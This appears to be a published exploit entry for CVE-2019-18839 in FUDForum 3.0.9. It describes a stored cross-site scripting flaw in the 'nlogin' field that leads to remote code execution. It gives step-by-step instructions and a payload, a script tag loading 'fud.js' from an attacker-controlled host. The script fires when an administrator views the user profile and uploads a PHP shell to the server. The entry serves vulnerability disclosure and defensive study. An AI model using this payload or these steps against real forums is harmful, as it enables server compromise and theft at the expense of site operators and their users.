# FUDForum 3.0.9 - Stored XSS / Remote Code Execution [via Forum]

- Date                  : 11/8/19
- Exploit Author        : liquidsky (JMcPeters)
- Vulnerable Software   : FUDForum 3.0.9
- Vendor Homepage       : http://fudforum.org/forum/
- Version               : 3.0.9
- Software Link         : https://sourceforge.net/projects/fudforum/
- Tested On             : Windows / mysql / apache
- Author Site           : http://incidentsecurity.com | demo: https://youtu.be/0gsJQ82TXw4
- CVE                   : CVE-2019-18839

Greetz : wetw0rk, Fr13ndz, offsec

Description: FUDForum 3.0.9 is vulnerable to Stored XSS via the "nlogin" parameter. This may result in remote code execution. An attacker can use a user account to fully compromise the system using a POST request. When the admin visits the user information the payload will execute. This will allow for PHP files to be written to the web root, and for code to execute on the remote server.

Notes: 

1. Register an account and log in to the forum.

2. Go to the user control panel. -> Account Settings -> change login

3. Insert javascript payload <script/src="http://attacker.machine/fud.js"></script>

4. When the admin visits the user information the payload will fire, uploading a php shell on the remote system.
